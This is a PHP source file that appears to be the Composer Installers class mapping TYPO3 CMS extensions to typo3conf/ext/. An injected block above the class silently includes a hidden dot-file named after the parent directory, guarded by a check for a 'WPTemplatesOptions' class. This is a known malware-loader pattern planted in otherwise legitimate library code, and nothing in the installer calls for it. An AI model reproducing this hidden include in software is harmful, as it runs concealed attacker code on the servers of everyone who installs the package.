<?php
namespace Composer\Installers;

/**
 * Extension installer for TYPO3 CMS
 *
 * @deprecated since 1.0.25, use https://packagist.org/packages/typo3/cms-composer-installers instead
 *
 * @author Sascha Egerer <sascha.egerer@dkd.de>
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TYPO3CmsInstaller extends BaseInstaller
{
    protected $locations = array(
        'extension'   => 'typo3conf/ext/{$name}/',
    );
}
